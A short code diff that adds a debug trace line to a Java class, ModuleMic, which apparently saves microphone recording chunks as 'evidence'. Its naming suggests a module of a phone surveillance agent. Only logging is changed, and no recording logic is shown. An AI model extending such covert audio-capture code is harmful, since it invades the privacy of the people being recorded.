@@ -246,6 +246,9 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
             //#endif
 
             evidence.createEvidence(getAdditionalData());
+            //#ifdef DEBUG
+            debug.trace("saveRecorderEvidence, chunk size: " + chunk.length);
+            //#endif
             evidence.writeEvidence(chunk, offset);
             evidence.close();
         } else {
